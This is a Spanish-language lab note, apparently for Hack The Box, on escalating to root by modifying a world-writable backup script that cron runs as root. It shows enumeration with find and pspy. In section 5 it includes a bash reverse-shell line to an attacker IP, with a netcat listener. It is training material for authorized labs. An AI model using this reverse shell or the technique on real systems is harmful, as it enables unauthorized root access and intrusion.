
## 1. Concepto

**Cron** permite programar la ejecución automática de comandos y scripts. Si una tarea se ejecuta como `root` y utiliza un script que podemos modificar, podemos aprovecharlo para escalar privilegios.

Ejemplo de programación:

```
0 */12 * * * /home/admin/backup.sh
```

Se ejecuta cada 12 horas, en el minuto 0.

Formato de una entrada de cron:

```
MINUTO HORA DÍA MES DÍA_SEMANA COMANDO
```

## 2. Enumerar archivos con permisos de escritura

Busca archivos que cualquier usuario pueda modificar:

```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Presta atención a:

- Scripts de copias de seguridad.
    
- Scripts dentro de directorios como `/etc/cron.d/`.
    
- Archivos que pertenezcan a `root` pero tengan permisos de escritura para todos.
    

Comprueba los permisos de un archivo sospechoso:

```
ls -la /dmz-backups/
```

Ejemplo del laboratorio:

```
-rwxrwxrwx 1 root root 230 backup.sh
```

Los permisos `rwxrwxrwx` indican que cualquier usuario puede modificar el script.

## 3. Identificar tareas Cron en ejecución

Si no puedes consultar directamente la configuración de cron, puedes utilizar **pspy** para observar procesos sin necesitar privilegios de root.

```
./pspy64 -pf -i 1000
```

Parámetros:

- `-p`: muestra eventos relacionados con procesos.
    
- `-f`: muestra eventos del sistema de archivos.
    
- `-i 1000`: escanea cada 1000 milisegundos, es decir, cada segundo.
    

Ejemplo de salida:

```
CMD: UID=0 | /bin/bash /dmz-backups/backup.sh
CMD: UID=0 | /bin/sh -c /dmz-backups/backup.sh
CMD: UID=0 | tar --absolute-names --create --gzip --file=...
```

Esto indica que el script se está ejecutando como `root`.

### Comprobar la frecuencia

Examina los archivos generados por la tarea:

```
ls -la /dmz-backups/
```

Si aparecen copias de seguridad cada tres minutos, puedes deducir que la tarea se ejecuta aproximadamente con esa frecuencia.

Por ejemplo:

```
*/3 * * * * /dmz-backups/backup.sh
```

Significa que se ejecuta cada tres minutos.

## 4. Analizar el script vulnerable

Ejemplo del laboratorio:

```
cat /dmz-backups/backup.sh
```

Contenido:

```
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

El script crea una copia comprimida del directorio `/var/www/html` y la guarda en `/dmz-backups/`.

**La vulnerabilidad:** el script se ejecuta como `root` y tiene permisos de escritura para cualquier usuario.

## 5. Explotación mediante una shell inversa

En el laboratorio, HTB modifica el script para añadir al final una shell inversa:

```
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

Sustituye `10.10.14.3` por la IP de tu máquina atacante y utiliza el puerto correspondiente a tu listener.

Antes de esperar a que se ejecute la tarea, inicia el listener en tu máquina atacante:

```
nc -lvnp 443
```

Cuando cron vuelva a ejecutar el script como `root`, la conexión puede proporcionar una shell con esos privilegios.

**Importante:** haz una copia del script original antes de modificarlo. Este procedimiento es para laboratorios autorizados.

## 6. Verificar la escalada

Una vez recibida la shell:

```
id
```

Resultado esperado:

```
uid=0(root) gid=0(root) groups=0(root)
```

También puedes comprobar el nombre del sistema:

```
hostname
```

## 7. Checklist para HTB

1. Buscar archivos con permisos de escritura para todos.
    
2. Identificar scripts que puedan ejecutarse mediante cron.
    
3. Comprobar los permisos con `ls -la`.
    
4. Utilizar pspy para observar procesos y confirmar quién ejecuta el script.
    
5. Revisar el contenido del script.
    
6. Si puedes modificarlo y se ejecuta como root, evaluar el riesgo.
    
7. Comprobar los privilegios obtenidos con `id`.
    

### Comandos clave

```
# Buscar archivos modificables por cualquier usuario
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# Comprobar permisos
ls -la /dmz-backups/

# Observar procesos
./pspy64 -pf -i 1000

# Verificar privilegios
id
```

**Idea clave:** busca una tarea cron que se ejecute como `root` y que utilice un script modificable por tu usuario. Esa combinación es la que permite plantear la escalada de privilegios.
